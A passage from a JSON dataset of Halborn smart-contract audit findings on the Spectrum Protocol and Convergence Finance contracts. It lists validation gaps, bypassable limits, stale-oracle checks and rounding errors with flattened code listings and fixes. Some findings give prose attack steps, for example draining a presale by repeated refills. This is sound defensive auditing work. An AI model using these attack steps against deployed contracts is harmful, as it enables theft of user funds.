slippage_tolerance parameter in bond function and add a validation routine to ensure that this value is lesser or equal than a predefined max value. As a reference, max slippage tolerance for Uniswap liquidity pools is 50%. Remediation plan: SOLVED: Issue fixed in commit f298e93f5d0a018a03302f9a317f650d061b5020. 20 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "NO MINIMUM THRESHOLD FOR EFFECTIVE DELAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "Timelocks are defined in Governance contracts to allow protocol users to react timely if a change made is bad faith or is not in the best interest of protocol and its users. The init and update_config functions from contracts/spectrum_gov/src/- contract.rs do not restrict that timelock (effective_delay) is greater or equal than a minimum threshold. So, malicious changes proposed through voting could even be executed immediately if effective_delay is not set appropriately. Code Location: Listing 10: contracts/spectrum_gov/src/contract.rs (Lines 39) 29 30 31 32 33 34 35 36 37 38 39 40 let config = Config { owner : deps . api . canonical_address (& msg . owner )? , spec_token : if let Some ( spec_token ) = msg . spec_token { deps . api . canonical_address (& spec_token )? } else { CanonicalAddr :: default () }, quorum : msg . quorum , threshold : msg . threshold , voting_period : msg . voting_period , effective_delay : msg . effective_delay , expiration_period : msg . expiration_period , Listing 11: contracts/spectrum_gov/src/contract.rs (Lines 225) 224 225 226 if let Some ( effective_delay ) = effective_delay { config . effective_delay = effective_delay ; } 21 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Add a validation routine inside init and update_config functions to ensure that timelock (effective_delay) is greater or equal than a minimum threshold that allows Spectrum users to act timely against any issue that protocol could have when changes are made. The following are some examples of timelocks used on other protocols:  Uniswap: 48-hours timelock  Compound: 48-hours timelock  Aave: 24-hours timelock (Short time lock) Remediation plan: SOLVED: Issue fixed in commit 224e758890d84ad4fbe15c554a587e164e5f92c6. 22 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "SPECTRUM PLATFORM COULD BE INITIALIZED WITH INSECURE QUORUM AND THRESHOLD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The init function from contracts/spectrum_platform/src/contract.rs only restrict that quorum and threshold parameters are not greater than one; however, when spectrum_platform is initialized, there will exist few boards, i.e.: who are able to vote, which allows that a malicious board can takeover spectrum_platform contract if the aforementioned parameters are not set appropriately. Attack scenario: 1. The spectrum_platform is initialized with the following parameters: quorum = 10% and threshold = 50%. 2. There are 3 boards, each one has a weight = 1. 3. Board 1 creates a new poll with a execution message that changes its own weight to 100. 4. Board 1 votes for VoteOption::yes. 5. Board 2 votes for VoteOption::no and Board 3 does not vote. 6. Voting phase ends and Board 1 will be able to change its own weight to 100. So, now he totally controls spectrum_platform for future voting, despite of vote results from other boards. Code Location: Listing 12: contracts/spectrum_platform/src/contract.rs (Lines 28,29) deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 18 pub fn init < S: Storage , A : Api , Q: Querier >( 19 20 21 22 ) -> StdResult < InitResponse > { 23 validate_quorum ( msg . quorum ) ?; 23 24 25 26 27 28 29 30 31 32 33 validate_threshold ( msg . threshold ) ?; let config = Config { owner : deps . api . canonical_address (& msg . owner )? , quorum : msg . quorum , threshold : msg . threshold , voting_period : msg . voting_period , effective_delay : msg . effective_delay , expiration_period : msg . expiration_period , }; Risk Level: Likelihood - 1 Impact - 4 Recommendation: Add a validation routine inside init function to ensure that quorum and threshold are greater or equal than 50%. Remediation plan: SOLVED: Issue fixed in commit 92d1cd57b8f78b4d562644ae1d8c64cd2e3d12ed. 24 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "NO VERIFICATION THAT LOCK END MUST BE GREATER OR EQUAL THAN LOCK START",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The init and update_config functions do not restrict that lock_end is These values are used to calculate greater or equal than lock_start. locked rewards when a user withdraws rewards from farms. If they are not correctly set, locked rewards could be miscalculated, so rewards distributed would be unfair. The affected smart contracts are the following:  spectrum_anchor_farm  spectrum_mirror_farm  spectrum_pylon_farm  spectrum_spec_farm Code Location: Listing 13: contracts/spectrum_anchor_farm/src/contract.rs 63 64 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 14: contracts/spectrum_anchor_farm/src/contract.rs 202 203 204 205 206 207 208 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } 25 Listing 15: contracts/spectrum_mirror_farm/src/contract.rs 66 67 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 16: contracts/spectrum_mirror_farm/src/contract.rs 206 207 208 209 210 211 212 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } Listing 17: contracts/spectrum_pylon_farm/src/contract.rs 63 64 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 18: contracts/spectrum_pylon_farm/src/contract.rs 202 203 204 205 206 207 208 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } Listing 19: contracts/spectrum_spec_farm/src/contract.rs 27 28 lock_start : msg . lock_start , lock_end : msg . lock_end , Listing 20: contracts/spectrum_spec_farm/src/contract.rs 148 149 150 if let Some ( lock_start ) = lock_start { config . lock_start = lock_start ; } 26 151 152 153 154 if let Some ( lock_end ) = lock_end { config . lock_end = lock_end ; } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside init and update_config functions to ensure that lock_end is greater or equal than lock_start. Remediation plan: SOLVED: Issue fixed in commit 6010909e58197a23c4e194e296250b569e9f0564. Validation routine has been applied in init functions and changes for lock_start / lock_end have been disabled in update_config functions. 27 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "DEPOSIT FEE RATE COULD BE SET TO A VALUE GREATER THAN 1",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The init function does not restrict that value of deposit_fee rate is greater than 1. This value is used to calculate deposit fee (and its splits) when a user provides liquidity to farm contracts. If it is not correctly set, the operation will always panic and wont allow legitimate users to provide liquidity, thus generating a denial of service (DoS) in Spectrum protocol. The affected smart contracts are the following:  spectrum_anchor_farm  spectrum_mirror_farm  spectrum_pylon_farm Code Location: Listing 21: contracts/spectrum_anchor_farm/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 28 pub fn init < S: Storage , A : Api , Q: Querier >( 29 30 31 32 ) -> StdResult < InitResponse > { 33 34 35 36 37 let api = deps . api ; validate_percentage ( msg . community_fee , \" community_fee \") ?; validate_percentage ( msg . platform_fee , \" platform_fee \" ) ?; validate_percentage ( msg . controller_fee , \" controller_fee \" ) ?; 28 Listing 22: contracts/spectrum_mirror_farm/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 31 pub fn init < S: Storage , A : Api , Q: Querier >( 32 33 34 35 ) -> StdResult < InitResponse > { 36 37 38 39 40 let api = deps . api ; validate_percentage ( msg . community_fee , \" community_fee \") ?; validate_percentage ( msg . platform_fee , \" platform_fee \" ) ?; validate_percentage ( msg . controller_fee , \" controller_fee \" ) ?; Listing 23: contracts/spectrum_pylon_farm/src/contract.rs deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 28 pub fn init < S: Storage , A : Api , Q: Querier >( 29 30 31 32 ) -> StdResult < InitResponse > { 33 34 35 36 37 let api = deps . api ; validate_percentage ( msg . community_fee , \" community_fee \") ?; validate_percentage ( msg . platform_fee , \" platform_fee \" ) ?; validate_percentage ( msg . controller_fee , \" controller_fee \" ) ?; Risk Level: Likelihood - 2 Impact - 3 Recommendation: Apply validate_percentage function inside init to ensure deposit_fee rate is lesser or equal than 1. Remediation plan: SOLVED: Issue fixed in commit 3d6bf3908ae1f0eb05aedc8a585015fbcc223120. 29 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "SPEC TOKENS MINTING START COULD BE GREATER THAN MINTING END",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The init and update_config functions from spectrum_gov contract do not restrict that mint_end is greater or equal than mint_start. These values are used to calculate how much SPEC tokens can be minted as reward to warchest and vaults. If they are not correctly set, amount of SPEC tokens to mint could be miscalculated, so reward distributed would be unfair. Code Location: Listing 24: contracts/spectrum_gov/src/contract.rs (Lines 43,44) validate_percentage ( msg . quorum , \" quorum \") ?; validate_percentage ( msg . threshold , \" threshold \") ?; validate_percentage ( msg . warchest_ratio , \" warchest_ratio \" ) ?; let config = Config { deps : & mut Extern <S , A , Q >, env : Env , msg : ConfigInfo , 20 pub fn init < S: Storage , A : Api , Q: Querier >( 21 22 23 24 ) -> StdResult < InitResponse > { 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 }, quorum : msg . quorum , threshold : msg . threshold , voting_period : msg . voting_period , effective_delay : msg . effective_delay , expiration_period : msg . expiration_period , CanonicalAddr :: default () } else { owner : deps . api . canonical_address (& msg . owner )? , spec_token : if let Some ( spec_token ) = msg . spec_token { deps . api . canonical_address (& spec_token )? 30 41 42 43 44 proposal_deposit : msg . proposal_deposit , mint_per_block : msg . mint_per_block , mint_start : msg . mint_start , mint_end : msg . mint_end , Listing 25: contracts/spectrum_gov/src/contract.rs (Lines 251,255) 250 251 252 253 254 255 256 257 258 259 260 261 262 if let Some ( mint_start ) = mint_start { config . mint_start = mint_start ; } if let Some ( mint_end ) = mint_end { config . mint_end = mint_end ; let mut state = state_store (& mut deps . storage ). load () ?; if validate_minted (& state , & config , env . block . height ). is_err () { state . last_mint = env . block . height ; state_store (& mut deps . storage ). save (& state ) ?; } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Add a validation routine inside init and update_config functions to ensure that mint_end is greater or equal than mint_start. Remediation plan: SOLVED: Issue fixed in commit 6010909e58197a23c4e194e296250b569e9f0564. Validation routine has been applied in init function and changes for mint_start / mint_end have been disabled in update_config function. 31 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "NO MECHANISM TO UPDATE ASSETS IF ARE INCORRECTLY REGISTERED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The register_asset function from contracts/spectrum_mirror_farm/src/con- tract.rs does not allow updating staking_token parameter if asset is incorrectly registered. Due to the fact the spectrum_mirror_farm handles many assets, if there is any issue with the register of one of them, the contract will never be able to use this asset because it cannot be updated, nor registered again. Code Location: Listing 26: contracts/spectrum_mirror_farm/src/contract.rs (Lines 243) 240 241 242 243 244 245 246 247 248 let mut pool_info = pool_info_read (& deps . storage ) . may_load ( asset_token_raw . as_slice () )? . unwrap_or_else (|| PoolInfo { staking_token : deps . api . canonical_address (& staking_token ). unwrap () , total_auto_bond_share : Uint128 :: zero () , total_stake_bond_share : Uint128 :: zero () , total_stake_bond_amount : Uint128 :: zero () , weight : 0 u32 , auto_compound : false , Risk Level: Likelihood - 2 Impact - 3 32 Recommendation: is recommended It updating register_asset staking_token parameter only if assets pool is empty, i.e.: bond amount and bond share are zero. function allows that Remediation plan: SOLVED: Issue fixed in commit 25c7941918e30a8c8f01b3c79c83c78483578803. 33 ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Low"
        ]
    },
    {
        "title": "BOND FUNCTION COULD SEND LP TOKENS TO INVALID FARM CONTRACTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Spectrum_Protocol_CosmWasm_Smart_Contract_Security_Audit_Halborn_Report_v1_1.pdf",
        "body": "The bond function from contracts/spectrum_staker/src/contract.rs does not restrict that the contract parameter sent is an address of an actual farm contract: Anchor, Mirror, Pylon or Spec. As a consequence, if a user mistakenly (or fooled by an attacker) sends an incorrect address in the aforementioned parameter, the tokens deposited in spectrum_staker contract can be totally lost. Code Location: Listing 27: contracts/spectrum_staker/src/contract.rs (Lines 159) 156 CosmosMsg :: Wasm ( WasmMsg :: Execute { 157 158 159 160 161 162 163 164 165 166 167 }) ?, send : vec! [] , }) , contract_addr : env . contract . address , msg : to_binary (& HandleMsg :: bond_hook { contract , asset_token : token_addr . clone () , staking_token : terraswap_pair . liquidity_token , staker_addr : env . message . sender , prev_staking_token_amount , compound_rate , Risk Level: Likelihood - 1 Impact - 3 34 Recommendation: Add a validation routine inside bond function to ensure that contract parameter belongs to a allowlist of actual farm contracts; otherwise, reject the operation. Remediation plan: SOLVED: Issue fixed in commit c785d1929ee09ce348feeac18b52fed51a8a7abb. 35 3.10 (HAL-10) HARVEST AND REINVEST FUNCTIONALITIES ARE NOT RESTRICTED ENOUGH - LOW ",
        "labels": [
            "Halborn",
            "Spectrum_Protocol_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "MERKLE TREE INVESTMENT LIMIT CAN BE BYPASSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The WlPresaleCvg contract allows users to buy CVG tokens if they are whitelisted in a Merkle tree. Currently, there are 3 Merkle trees, each one with a different investment limit:  Small with a maximum of 800 * 10e18 CVG tokens.  Medium with a maximum of 4,000 * 10e18 CVG tokens.  Large with a maximum of 8,000 * 10e18 CVG tokens. Users invest by sending the amount to invest, Merkle proof and the type of Merkle tree to the investMint function. This function checks that the amount is below the list type limit and mints a position NFT to the user. Moreover, the refillToken function allows users to refill a position NFT as long as the new total amount does not exceed the Merkle type limit. However, although this function properly increases the cvgRedeemable variable, it does not properly increase the stableInvested amount used to determine whether an investment has exceeded the limit. This allows a malicious user to invest the minimum amount required in order to create a position NFT and later call refillToken multiple times, allowing them to retrieve the whole CVG Tokens, not only bypassing their Merkle tree limits but also leaving other users in the Merkle trees without any tokens. 21 Code Location: Listing 1: contracts/PresaleVesting/WlPresaleCvg.sol 232 function refillToken ( uint256 _tokenId , 233 uint256 _amount , 234 bool _isDai 235 236 ) external { 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 require ( ); \" TOO_MUCH_Q_WL \" require ( ownerOf ( _tokenId ) == msg . sender , \" NOT_OWNED \" ); IERC20 token = _isDai ? Dai : Frax ; uint256 _vestingType = presaleInfos [ _tokenId ]. vestingType ; uint256 cvgAmount = ( _amount * NUMERATOR ) / PRICE_WL ; wlParams [ _vestingType ]. cvgRedeemable += cvgAmount ; _amount + presaleInfos [ _tokenId ]. stableInvested <= wlParams [ _vestingType ]. maxInvest , // / @dev update the presales info for this address , only  change cvgAmount presaleInfos [ _tokenId ]. cvgAmount += cvgAmount ; // / @dev Update available supply supply -= cvgAmount ; // / @dev Transfer token . transferFrom ( msg . sender , address ( this ) , _amount ); 253 254 255 256 257 258 259 260 } BVSS: AO:A/AC:L/AX:L/C:N/I:C/A:C/D:N/Y:C/R:N/S:U (10) 22 Proof of Concept: 1. A malicious user calls investMint() to create a new position. 2. Malicious users call refillToken() multiple times, bypassing the Merkle tree limit and ending with all CVG Token supply. 3. Now, legitimate users can no longer receive their CVG tokens. Recommendation: It is recommended to increase the stableInvested variable in the refillToken function. Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by increasing the stableInvested amount when calling refillToken() in commit 20414f9. 23 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Critical"
        ]
    },
    {
        "title": "REVOKED SCHEDULES CAN BE USED TO RELEASE CVG",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the VestingCvg contract, the revokeVestingSchedule function allows This function reduces the revoking an existing vesting schedule. vestingSchedulesTotalAmount by the amount of CVG pending release. However, when releasing the CVG with any of the available functions (releaseSeed, releaseWl or releaseTeamOrDao) the last vesting sched- ule is retrieved without checking the revoked variable. Even if a new schedule is introduced, if a user calls any of the release functions while the current schedule is revoked, the user can release CVG tokens with the revoked schedule and the released amount is deducted from the vestingSchedulesTotalAmount, causing an underflow for other legitimate user when they are trying to release their tokens. 24 Code Location: Listing 2: contracts/PresaleVesting/VestingCvg.sol 238 function releaseSeed ( uint256 _tokenId ) external onlyOwnerOfSeed (  _tokenId ) { ( 239 240 241 242 243 244 245 uint256 amountToRelease , , , uint256 vestingScheduleId ) = _computeReleaseAmount ( _tokenId , true ); require ( amountToRelease > 0, \" NOT_RELEASABLE \" ); // @audit Not  checking if revoked . 246 247 // update totalReleased & amountReleasedId &  vestingSchedulesTotalAmount 248 vestingSchedules [ vestingScheduleId ]. totalReleased +=  amountToRelease ; amountReleasedIdSeed [ _tokenId ] += amountToRelease ; vestingSchedulesTotalAmount -= amountToRelease ; // transfer Cvg amount to release cvg . transfer ( msg . sender , amountToRelease ); 249 250 251 252 253 254 255 256 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (10) 25 Proof of Concept: 1. An existing vesting schedule is revoked by the administrator. 2. A user with that vesting schedule assigned releases his vested CVG. 3. Vesting schedule gets executed even if it is revoked. 4. When the total released amount approaches the limit, the release functions will underflow for other legitimate users. Recommendation: It is recommended to implement a check to prevent users from releasing CVG if their assigned schedule has been revoked. Remediation Plan: SOLVED: The Convergence Finance team solved this issue by preventing the release functions from being called with a revoked schedule in commit 20414f9. 26 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Critical"
        ]
    },
    {
        "title": "ORACLE RESPONSE NOT CHECKED FOR STALE PRICES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the CvgOracle contract, the getPriceAggregator function allows the oracle to retrieve the price from a Chainlink aggregator. However, this function is not retrieving the answeredInRound and timestamp parameters to check if the prices are stale. This could lead to the oracle using stale prices in the event that the Chainlink oracle is not being updated. Code Location: Listing 3: contracts/Oracles/CvgOracle.sol 163 function getPriceAggregator ( AggregatorV3Interface aggregator )  public view returns ( uint256 ) { 164  ; 165 (, int256 chainlinkPrice , , , ) = aggregator . latestRoundData () return uint256 ( chainlinkPrice ) * 10 ** (18 - aggregator .  decimals () ); 166 } BVSS: AO:A/AC:L/AX:H/C:N/I:C/A:N/D:C/Y:C/R:N/S:U (5.0) Recommendation: Make sure the prices returned by the Chainlink aggregator are not stale. 27 Listing 4: contracts/Oracles/CvgOracle.sol AggregatorV3Interface aggregator ( uint80 chain , int256 chainlinkPrice , , uint256 updatedAt , uint80 answeredInRound 193 function getPriceAggregator ( 194 195 ) public view returns ( uint256 ) { 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 ); ) = aggregator . latestRoundData () ; require ( answeredInRound >= roundID , \" Stale price \" ); require ( chainlinkPrice > 0, \" Error . NEGATIVE_PRICE \"); require ( block . timestamp <= updatedAt + stalePriceDelay , Error . STALE_PRICE return uint256 ( chainlinkPrice ) * 10 ** (18 - aggregator .  decimals () ); 212 } Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by checking for stale prices in the getAndVerifyPrice() function in commit 20414f9. 28 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRICE FEED AGGREGATOR NOT RETURNING ADDITIONAL PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the CvgV3Aggregator contract, the latestRoundData function returns 0 for the roundId, startedAt, updatedAt, answeredInRound parameters. This does not only disallow to check for stale prices, but it also prevents the aggregator from working with standard contracts that check for stale prices. Code Location: Listing 5: contracts/Oracles/CvgV3Aggregator.sol external view returns ( uint80 roundId , int256 answer , uint256 startedAt , 52 function latestRoundData () 53 54 55  uint256 updatedAt , uint80 answeredInRound ) 56 { 57 58 } return (0 , latestPrice , 0, 0, 0) ; BVSS: AO:A/AC:L/AX:H/C:N/I:C/A:N/D:C/Y:C/R:N/S:U (5.0) Recommendation: Return the proper values for each of the described parameters. 29 Remediation Plan: RISK ACCEPTED: The Convergence Finance team accepted the risk of this issue. 30 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Medium"
        ]
    },
    {
        "title": "CENTRALIZATION RISK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the current protocol model, the interactions with the aggregated protocol are performed manually through a multi-signature wallet. This means that all the funds received from users using the protocol are transferred to this wallet. This poses a concerning centralization risk as the users funds are sent to a private wallet. Moreover, if the private keys for the multi-signature wallets are ever compromised, all protocol funds could be stolen by a malicious actor. BVSS: AO:S/AC:L/AX:L/C:C/I:C/A:C/D:C/Y:C/R:N/S:C (5.0) Recommendation: Include as many interactions as possible into the smart contracts logic in order to decentralize the protocol. Remediation Plan: RISK ACCEPTED: The Convergence Finance team accepted the risk of this issue. 31 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Medium"
        ]
    },
    {
        "title": "NFT TIME LOCKING MECHANISM CAN BE BYPASSED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The CvgERC721TimeLocking contract used to mint position NFTS implements a time-locking mechanism which allows users to lock the NFT, so no rewards can be claimed in order to place it for sale. This prevents a malicious user from front-running a sale transaction and claiming all rewards just before selling it. However, the user can change the lock time frame at any time as long as the new timestamp is greater than the block timestamp. This prevents users from front-running with a new timestamp equal to the block timestamp, which would allow claiming rewards before selling. However, it is possible for a malicious user to determine whether the sell transaction is going to execute in a different block and perform a double front-run, unlocking the NFT in the first block and immediately claiming the rewards in the next one. Code Location: Listing 6: contracts/Token/CvgERC721TimeLocking.sol (Line 63) require ( timestamp > block . timestamp && timestamp - block . 62 function setLock ( uint256 tokenId , uint256 timestamp ) external  onlyNftOwner ( tokenId ) { 63  timestamp < maxLockingTime , \" WRONG_TIME_LOCK \" ); 64 65 } unlockingTimestampPerToken [ tokenId ] = timestamp ; 32 BVSS: AO:A/AC:L/AX:H/C:N/I:N/A:N/D:N/Y:C/R:N/S:U (3.3) Recommendation: Implement a buffer where the new timestamp cannot be earlier than a few minutes from the block timestamp. Remediation Plan: SOLVED: The Convergence Finance team fixed this issue by adding a buffer when changing the lock timestamp in commit 20414f9. 33 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "ROUNDING ERROR WHEN COMPUTING RELEASABLE AMOUNT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The calculateRelease function in the VestingCVG contract is in charge of computing the releasable amount on each slice of the vesting schedule. However, there is a small rounding error in the calculation of the release amount for each slice. This results in slices releasing fewer tokens than what they should. Code Location: Listing 7: contracts/PresaleVesting/VestingCvg.sol (Lines 392-405) uint256 vestingSchedulesId , uint256 totalAmount , uint256 totalAmountReleased 378 function calculateRelease ( 379 380 381 382 ) private view returns ( uint256 amountToRelease ) { 383 384 385 uint256 amountReleasable ; uint256 slices = vestingSchedules [ vestingSchedulesId ]. slices ; uint256 slicePeriod = vestingSchedules [ vestingSchedulesId ].  slicePeriods ; 386 uint256 releaseTimestamp = vestingSchedules [ vestingSchedulesId  ]. cliff ; 387 uint256 dropCliff = vestingSchedules [ vestingSchedulesId ].  dropCliff ; 388 389 390 391 392 393 uint256 amountDropCliff = ( totalAmount * dropCliff ) / 1000; uint256 endRelease = releaseTimestamp + slices * slicePeriod ; if ( block . timestamp >= releaseTimestamp ) { uint256 actualSlice = ( block . timestamp - releaseTimestamp )  / ( slicePeriod ); 394 395 if ( slices <= actualSlice ) { 34 396 397 398 amountReleasable = totalAmount ; } else { uint256 a = ( totalAmount - amountDropCliff ) / (  endRelease - releaseTimestamp ); 399 int256 b = int256 ( amountDropCliff ) - int256 ( a *  releaseTimestamp ); 400 uint256 x = releaseTimestamp + actualSlice *  slicePeriod ; amountReleasable = uint256 ( int256 ( a) * int256 (x ) + b); } amountToRelease = amountReleasable - totalAmountReleased ; } 401 402 403 404 405 406 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:L/R:N/S:U (2.5) Recommendation: Please see below for an optimized formula that simplifies the calcula- tions, achieving the same result without rounding errors: Listing 8: contracts/PresaleVesting/VestingCvg.sol (Lines 392-402) uint256 vestingSchedulesId , uint256 totalAmount , uint256 totalAmountReleased 378 function calculateRelease ( 379 380 381 382 ) private view returns ( uint256 amountToRelease ) { 383 384 385 uint256 amountReleasable ; uint256 slices = vestingSchedules [ vestingSchedulesId ]. slices ; uint256 slicePeriod = vestingSchedules [ vestingSchedulesId ].  slicePeriods ; 386 uint256 releaseTimestamp = vestingSchedules [ vestingSchedulesId  ]. cliff ; 387 uint256 dropCliff = vestingSchedules [ vestingSchedulesId ].  dropCliff ; 388 389 uint256 amountDropCliff = ( totalAmount * dropCliff ) / 1000; 35 390 391 392 393  / 394 395 396 397 398 399 uint256 endRelease = releaseTimestamp + slices * slicePeriod ; if ( block . timestamp >= releaseTimestamp ) { uint256 actualSlice = ( block . timestamp - releaseTimestamp ) ( slicePeriod ); if ( slices <= actualSlice ) { amountReleasable = totalAmount ; } else { amountReleasable = amountDropCliff + (( totalAmount -  amountDropCliff ) * actualSlice ) / slices ; } amountToRelease = amountReleasable - totalAmountReleased ; 400 401 402 403 } } Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by switching to a different non-slice based model in commit 46799c7. 36 ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "VESTING SCHEDULES WITH AN AMOUNT LOWER THAN MAXIMUM SUPPLY REVERT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Convergence_Finance_Convergence_Protocol_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "When releasing CVG for the team or DAO schedule, the CVG is computed based on the max supply instead of the total amount specified in the schedule. Therefore, specifying any amount below the max supply when creating the schedule results in users unable to release due to underflow. The vesting schedules are set by the contracts owner. Code Location: Listing 9: contracts/PresaleVesting/VestingCvg.sol (Lines 325,329) internal view returns ( uint256 amountToRelease , uint256 _vestingScheduleId ) bool _isTeam uint256 vestingType ; uint256 totalAmount ; uint256 totalAmountReleased ; 311 function _computeReleaseAmountTeamDao ( 312 313 ) 314 315 316 317 { 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 if ( _isTeam ) { } else { } totalAmountReleased = amountReleasedTeam ; vestingType = TYPE_TEAM ; totalAmount = MAX_SUPPLY_TEAM ; totalAmountReleased = amountReleasedDao ; vestingType = TYPE_DAO ; totalAmount = MAX_SUPPLY_DAO ; _vestingScheduleId = vestingIdForType [ vestingType ]; amountToRelease = calculateRelease ( 37 _vestingScheduleId , totalAmount , totalAmountReleased ); 334 335 336 337 338 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (2.0) Recommendation: Use the total amount specified when creating the vesting schedule, or implement a check to prevent a vesting schedule for the team or the DAO with a total amount below max supply from being created. Remediation Plan: SOLVED: The Convergence Finance team fixed the issue by allowing to create vesting schedules for the team or DAO with the max amount only in commit 20414f9. 38 RETESTING 39 The issue described in this section was brought to Halborns attention by the Convergence Finance team during the engagement. 5.1 CONVERGENCE01 - USER CAN SEND ALLOWANCE EXCESS TO THE CVGUTILITIES CONTRACT ",
        "labels": [
            "Halborn",
            "Convergence_Finance_Convergence_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "FUNDS CAN BE LOCKED IF THE ZONE DECIMAL IS HIGHER THAN 18",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Cosmos_Security_Audit_Report_Halborn_Final.pdf",
